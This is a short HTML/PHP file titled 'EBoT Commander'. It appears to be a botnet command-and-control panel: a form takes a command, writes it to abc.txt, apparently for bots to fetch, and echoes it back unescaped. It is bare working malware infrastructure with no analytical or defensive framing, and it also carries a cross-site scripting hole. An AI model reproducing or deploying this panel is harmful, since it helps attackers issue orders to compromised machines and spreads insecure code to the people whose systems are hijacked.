
HTML
<html>
<head>
<title>EBoT Commander</title>
</head>
<body style='color:#00FF00; background-color: black'>
<br>
<form action=# method=POST>
<input type=text name=cmd size=80>
<input type=submit value=Command>
</form>
<br>
</body>
</html>
<?php
$cmd = $_POST['cmd'];
$fp = fopen('abc.txt','w');
fwrite($fp,$cmd);
fclose($fp);
echo $cmd;
?>